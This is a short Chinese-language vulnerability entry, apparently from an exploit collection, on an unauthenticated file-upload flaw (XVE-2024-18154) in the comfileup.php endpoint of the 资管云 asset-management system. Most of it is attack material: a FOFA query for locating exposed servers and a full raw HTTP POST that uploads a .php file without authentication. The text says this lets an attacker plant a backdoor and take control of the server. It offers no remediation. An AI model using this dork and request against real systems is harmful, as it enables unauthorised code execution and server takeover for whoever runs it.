# 资管云comfileup.php前台文件上传漏洞(XVE-2024-18154)

百易云资产管理运营系统 comfileup.php 接口存在文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。

## fofa

```yaml
body="不要着急，点此"
title="资管云"
```

## poc

```javascript
POST /comfileup.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0)Gecko/20100101 Firefox/127.0
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: cna=JtMCH7NgWFYCAXBg5XNzopCe
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: multipart/form-data; boundary=--------1110146050
Content-Length: 117

----------1110146050
Content-Disposition: form-data; name="file";filename="test.php"

test 
----------1110146050--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252257165.png)
